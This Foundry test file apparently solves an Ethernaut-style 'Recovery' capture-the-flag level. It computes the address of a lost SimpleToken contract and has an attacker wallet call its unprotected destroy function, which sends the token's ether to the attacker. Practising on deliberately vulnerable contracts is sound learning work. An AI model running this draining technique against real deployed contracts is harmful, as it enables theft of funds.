// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.13;

import {VmSafe} from "forge-std/Vm.sol";
import {Test, console} from "forge-std/Test.sol";
import {Recovery, SimpleToken} from "../src/Level17.sol";

contract Level17Test is Test {
    Recovery public target;
    address public token;
    VmSafe.Wallet attacker;

    function setUp() public {
        attacker = vm.createWallet("attacker");
        VmSafe.Wallet memory deployer = vm.createWallet("deployer");
        vm.deal(deployer.addr, 1 ether);

        vm.startPrank(deployer.addr, deployer.addr);
        target = new Recovery();
        target.generateToken("ST", 100 ether);
        token = vm.computeCreateAddress(address(target), 1);
        payable(token).call{value: 0.001 ether}("");
        vm.stopPrank();

    }

    function test_exploit() public {
        vm.startPrank(attacker.addr, attacker.addr);
        exploit(address(token), attacker.addr);
        vm.stopPrank();

        assertEq(address(token).balance, 0);
    }

    function exploit(address _token, address _attacker) private {
        SimpleToken(payable(_token)).destroy(payable(_attacker));
    }
}
